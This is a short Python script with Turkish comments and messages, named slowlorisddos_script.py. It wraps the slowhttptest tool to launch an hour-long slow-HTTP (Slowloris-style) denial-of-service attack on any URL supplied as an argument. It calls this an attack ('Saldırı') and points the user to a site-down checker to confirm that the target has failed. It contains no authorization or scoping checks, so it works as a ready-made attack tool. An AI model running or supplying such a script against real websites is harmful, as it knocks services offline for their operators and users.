import os
import subprocess
import sys
import validators
import time

OUTPUT_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'outputs')
os.makedirs(OUTPUT_DIR, exist_ok=True)

def check_slowhttptest_installed():
    """slowhttptest aracının yüklü olup olmadığını kontrol eder."""
    try:
        subprocess.run(["slowhttptest", "-h"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except subprocess.CalledProcessError as e:
        print("slowhttptest yüklü, ancak çalıştırılamadı. Hata:", e)
        sys.exit(1)
    except FileNotFoundError:
        print("slowhttptest aracı yüklü değil. Lütfen aracı yükleyin.")
        sys.exit(1)

def validate_url(url):
    """URL'nin geçerli olup olmadığını kontrol eder."""
    if not validators.url(url):
        print("Geçersiz URL. Lütfen geçerli bir URL girin.")
        sys.exit(1)

def run_slowhttptest(url):
    """slowhttptest aracını belirtilen URL üzerinde çalıştırır ve terminale canlı çıktı verir."""
    try:
        output_dir = os.path.join(OUTPUT_DIR, "slow-test")
        command = [
            "slowhttptest", "-c", "1000", "-H", "-r", "200", "-c", "400", "-i", "10",
            "-t", "POST", "-l", "3600", "-o", output_dir,
            "-g", "-u", url
        ]
        print("\nSlowloriss Saldırısı başlatılıyor...\n")
        print("Web sitesinde bir düşme olup olmadığını tespit etmek için siteden bakınız: [https://www.isitdownrightnow.com/]\n")
        time.sleep(2)
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        # Canlı çıktıyı yakalamak ve terminalde göstermek için bir döngü
        while True:
            output = process.stdout.readline()
            if output == '' and process.poll() is not None:
                break
            if output:
                print(output.strip())
                sys.stdout.flush()

        process.wait()  # İşlemin tamamlanmasını bekliyoruz
        if process.returncode == 0:
            print("\nSaldırı tamamlandı. Çıktılar belirtilen dosyada saklandı.")
        else:
            print("\nSaldırı sırasında bir hata oluştu.")
    except subprocess.CalledProcessError as e:
        print("Saldırı sırasında bir hata oluştu. Hata kodu:", e.returncode)
        print("Hata mesajı:", e.stderr.decode())
    except KeyboardInterrupt:
        print("\nİşlem kullanıcı tarafından durduruldu.")
        sys.exit(1)
    except Exception as e:
        print("Beklenmeyen bir hata oluştu:", str(e))
        sys.exit(1)

def main():
    if len(sys.argv) != 2:
        print("Kullanım: python3 slowlorisddos_script.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    validate_url(url)
    #check_slowhttptest_installed()  # slowhttptest'in yüklü olup olmadığını kontrol et
    run_slowhttptest(url)

if __name__ == "__main__":
    main()
